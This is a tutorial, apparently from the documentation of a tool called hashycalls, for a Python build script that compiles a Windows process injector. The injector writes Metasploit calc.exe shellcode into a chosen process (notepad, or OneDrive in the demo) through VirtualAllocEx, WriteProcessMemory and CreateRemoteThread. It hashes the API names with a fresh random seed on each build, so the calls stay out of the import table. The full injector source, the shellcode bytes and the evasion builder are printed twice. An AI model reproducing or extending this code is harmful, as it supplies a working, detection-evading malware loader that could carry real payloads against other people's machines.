# Writing a compilation script with Hashycalls
In the [writing a basic injector](/hashycalls/docs/en/tutorials/writing-a-basic-injector.md) script, we wrote an injector which locates the notepad process on the host & injects some calculator shellcode into it via classic injection.

This tutorial demonstrates hashycalls ability for use in compilation scripts. This compilation script will compile the implant with new hashes for each function on each compilation.

## Step 0; Imports
In the first part of our code, we'll need to define the necessary library imports.

```py
import argparse
import random
import subprocess
import os
from hashycalls import HashyCalls
```

## Step 1; Writing the main function (arguments)
For demonstration purposes, this script will be entirely architected from the main function. The first code to run after main decleration should be the scripts arguments. 

The arguments i've chosen for the demo script are --outfile, --target & --algo. These arguments set the name of the compiled executable, the target process to inject and the hashing algorithm to use for API resolution.

```py
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--outfile', help='A name for the compiled executable.', default='skynet.exe')
    parser.add_argument('-t', '--target', help='A target process name to inject to. (case sensitive)', default='notepad.exe')
    parser.add_argument('-a', '--algo', help='A hashing algorithm for dynamic api resolution', choices=['djb2', 'sdbm'], default='djb2')
    args = parser.parse_args()
```

## Step 2; Importing main source
We'll need to import our source code for the implant to the script. In this demonstration, we have defined a multi line string variable to hold the source code for main.

```py
    main_source = """# include <windows.h>
# include <tlhelp32.h>
# include "hashycalls.h"

# define TARGET_PROCESS L"%s"

int main()
{
    /* msf calc.exe */
	char shellcode[] = {
		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
		0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
		0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
		0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
		0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
		0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
		0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
		0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
		0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
		0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
		0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
		0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
		0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
		0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
		0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
		0x65, 0x78, 0x65, 0x00
	};
	
    PROCESSENTRY32W Process			= { .dwSize = sizeof( PROCESSENTRY32W ) };
	HANDLE			hSnapshot		= 0,
					hProcess		= 0,
					hThread			= 0;
	PVOID			pShellcode		= 0;
	SIZE_T			BytesWritten	= 0;
	DWORD			OldProtection	= 0;
	
    if (!InitApiCalls())
		return -1;
	
    hSnapshot = EXEC( Kernel32, CreateToolhelp32Snapshot ) ( TH32CS_SNAPPROCESS, 0 );
	EXEC( Kernel32, Process32FirstW ) ( hSnapshot, &Process );
	
    do 
	{
		if ( Process.th32ProcessID && Process.szExeFile ) 
		{
			if ( EXEC( Ntdll, wcscmp ) (Process.szExeFile, TARGET_PROCESS ) == 0 )
			{
				hProcess = EXEC( Kernel32, OpenProcess ) ( PROCESS_ALL_ACCESS, FALSE, Process.th32ProcessID );
			}
		}
	} while ( EXEC( Kernel32, Process32NextW ) ( hSnapshot, &Process ) );
	
    if ( !hProcess )
		return -1;

	pShellcode = EXEC( Kernel32, VirtualAllocEx ) ( hProcess, 0, sizeof( shellcode ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	EXEC( Kernel32, WriteProcessMemory ) ( hProcess, pShellcode, shellcode, sizeof( shellcode ), &BytesWritten );
	EXEC( Kernel32, VirtualProtectEx ) ( hProcess, pShellcode, sizeof( shellcode ), PAGE_EXECUTE_READ, &OldProtection );
	hThread = EXEC( Kernel32, CreateRemoteThread ) ( hProcess, 0, 0, ( LPTHREAD_START_ROUTINE )pShellcode, 0, 0, 0);
	EXEC( Kernel32, WaitForSingleObject( hThread, INFINITE ) );
	EXEC( Kernel32, CloseHandle( hProcess ) );
	EXEC( Kernel32, CloseHandle( hThread ) );
	return 0;
}
""" % args.target
```

## Step 3; Writing the compiler code
We'll need to write a compilation script for the binary. This example uses the MSVC compiler which limits the scripts functionality to windows.

> [!IMPORTANT]
> Hashycalls doesn't support compilation with another compiler at the moment. This is subject to change in the future. Compilation has not been tested with another compiler so there's a possibility it could work with minor adjustments to this module. 

```py
    compiler = f"""@echo off
call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
cd "{os.getcwd()}"
cl main.c hashycalls.c
link.exe main.obj hashycalls.obj /OUT:{args.outfile}
"""
```

## Step 4; Defining the hashycalls object
We're ready to define the hashycalls object. The most important part here is the **apicalls** parameter. This defines which apicalls to include in the hashycalls template. 

Refer to the [scripting](/hashycalls/docs/en/usage/hashycalls/scripting.md) documentation if you are unfamiliar with the HashyCalls object parameters.

```py
    hashy = HashyCalls(
        globals         = True
        , apicalls      = [
            'CreateToolhelp32Snapshot', 
            'Process32FirstW', 
            'Process32NextW', 
            'wcscmp', 
            'OpenProcess', 
            'VirtualAllocEx', 
            'VirtualProtectEx', 
            'WriteProcessMemory', 
            'CreateRemoteThread', 
            'WaitForSingleObject', 
            'CloseHandle'
        ]
        , api_list_name = 'hWin32'
        , algo          = args.algo
        , debug         = False
        , seed          = random.randint(1, 10000)
    )
```

## Step 5; Writing all files to disk
We'll need to write each file to disk in a location where the compilation script can access it. This demonstration will use the current working directory of the script to deposit each file prior to compilation.

```py
    hashy.source.write_to_dir('.')
    hashy.header.write_to_dir('.')
    with open('main.c', 'w') as file:
        file.write(main_source)
    with open('compile.bat', 'w') as file:
        file.write(compiler)
```

## Step 5; Compiling the script
Now we need to compile the script. We can do this by launching the batch file with the subprocess module.

```py
subprocess.run(['cmd.exe', '/c', 'compile.bat'])
```

## Step 6; Cleaning up the temp files
To avoid having leftover ephemeral files on the system, a cleanup section has been added to remove them.

```py
    os.remove(hashy.source.filename)
    os.remove(hashy.header.filename)
    os.remove('hashycalls.obj')
    os.remove('compile.bat')
    os.remove('main.c')
    os.remove('main.obj')
```


# Completed Script
This is the completed script. This script will compile an injector which targets the process specified by the user. This could be extended further to allow the user to change / encrypt the shellcode or perform other operations however this is out of scope for this tutorial. Each time the script is run, a binary will be produced with differing hashes from the previous binary.

```py
import argparse
import random
import subprocess
import os
from hashycalls import HashyCalls

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--outfile', help='A name for the compiled executable.', default='skynet.exe')
    parser.add_argument('-t', '--target', help='A target process name to inject to. (case sensitive)', default='notepad.exe')
    parser.add_argument('-a', '--algo', help='A hashing algorithm for dynamic api resolution', choices=['djb2', 'sdbm'], default='djb2')
    args = parser.parse_args()

    main_source = """# include <windows.h>
# include <tlhelp32.h>
# include "hashycalls.h"

# define TARGET_PROCESS L"%s"

int main()
{
    /* msf calc.exe */
	char shellcode[] = {
		0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
		0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
		0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
		0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
		0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
		0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
		0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
		0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
		0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
		0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
		0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
		0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
		0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
		0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
		0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
		0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
		0x65, 0x78, 0x65, 0x00
	};
	
    PROCESSENTRY32W Process			= { .dwSize = sizeof( PROCESSENTRY32W ) };
	HANDLE			hSnapshot		= 0,
					hProcess		= 0,
					hThread			= 0;
	PVOID			pShellcode		= 0;
	SIZE_T			BytesWritten	= 0;
	DWORD			OldProtection	= 0;
	
    if (!InitApiCalls())
		return -1;
	
    hSnapshot = EXEC( Kernel32, CreateToolhelp32Snapshot ) ( TH32CS_SNAPPROCESS, 0 );
	EXEC( Kernel32, Process32FirstW ) ( hSnapshot, &Process );
	
    do 
	{
		if ( Process.th32ProcessID && Process.szExeFile ) 
		{
			if ( EXEC( Ntdll, wcscmp ) (Process.szExeFile, TARGET_PROCESS ) == 0 )
			{
				hProcess = EXEC( Kernel32, OpenProcess ) ( PROCESS_ALL_ACCESS, FALSE, Process.th32ProcessID );
			}
		}
	} while ( EXEC( Kernel32, Process32NextW ) ( hSnapshot, &Process ) );
	
    if ( !hProcess )
		return -1;

	pShellcode = EXEC( Kernel32, VirtualAllocEx ) ( hProcess, 0, sizeof( shellcode ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
	EXEC( Kernel32, WriteProcessMemory ) ( hProcess, pShellcode, shellcode, sizeof( shellcode ), &BytesWritten );
	EXEC( Kernel32, VirtualProtectEx ) ( hProcess, pShellcode, sizeof( shellcode ), PAGE_EXECUTE_READ, &OldProtection );
	hThread = EXEC( Kernel32, CreateRemoteThread ) ( hProcess, 0, 0, ( LPTHREAD_START_ROUTINE )pShellcode, 0, 0, 0);
	EXEC( Kernel32, WaitForSingleObject( hThread, INFINITE ) );
	EXEC( Kernel32, CloseHandle( hProcess ) );
	EXEC( Kernel32, CloseHandle( hThread ) );
	return 0;
}
""" % args.target

    compiler = f"""@echo off
call "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
cd "{os.getcwd()}"
cl main.c hashycalls.c
link.exe main.obj hashycalls.obj /OUT:{args.outfile}
"""

    hashy = HashyCalls(
        globals         = True
        , apicalls      = [
            'CreateToolhelp32Snapshot', 
            'Process32FirstW', 
            'Process32NextW', 
            'wcscmp', 
            'OpenProcess', 
            'VirtualAllocEx', 
            'VirtualProtectEx', 
            'WriteProcessMemory', 
            'CreateRemoteThread', 
            'WaitForSingleObject', 
            'CloseHandle'
        ]
        , api_list_name = 'hWin32'
        , algo          = args.algo
        , debug         = False
        , seed          = random.randint(1, 10000)
    )

    hashy.source.write_to_dir('.')
    hashy.header.write_to_dir('.')
    with open('main.c', 'w') as file:
        file.write(main_source)
    with open('compile.bat', 'w') as file:
        file.write(compiler)

    subprocess.run(['cmd.exe', '/c', 'compile.bat'])

    os.remove(hashy.source.filename)
    os.remove(hashy.header.filename)
    os.remove('hashycalls.obj')
    os.remove('compile.bat')
    os.remove('main.c')
    os.remove('main.obj')
```

# Demonstration
We'll now demostrate the functionality of the script.

## Compilation
First, we compile the injector using the command line:
```
python builder.py --outfile injector.exe --target OneDrive.exe --algo sdbm
```

This will compile the injector under the name injector.exe, configuring it to resolve api hashes via the sdbm algorithm. Additionally, the injector will now target OneDrive rather than notepad.

![building injector with script](/hashycalls/docs/img/building-injector-with-script.png)

## Static Analysis
Now, we'll take a look at the import address table to see if our function calls our present. Using dumpbin & select-string, we can search for our API calls. 

> [!NOTE]
> In this example, CloseHandle appears however this is a default API call included in most compiled binaries on windows so it's expected to be there as we didn't exclude any default libraries during compilation.

![dumping-import-address-table](/hashycalls/docs/img/dumping-import-address-table.png)

## Execution
Now we need to make sure the injector works. As expected, the injector locates onedrive & runs some calculator shellcode in it's address space.

![executing-injector](/hashycalls/docs/img/execution.gif)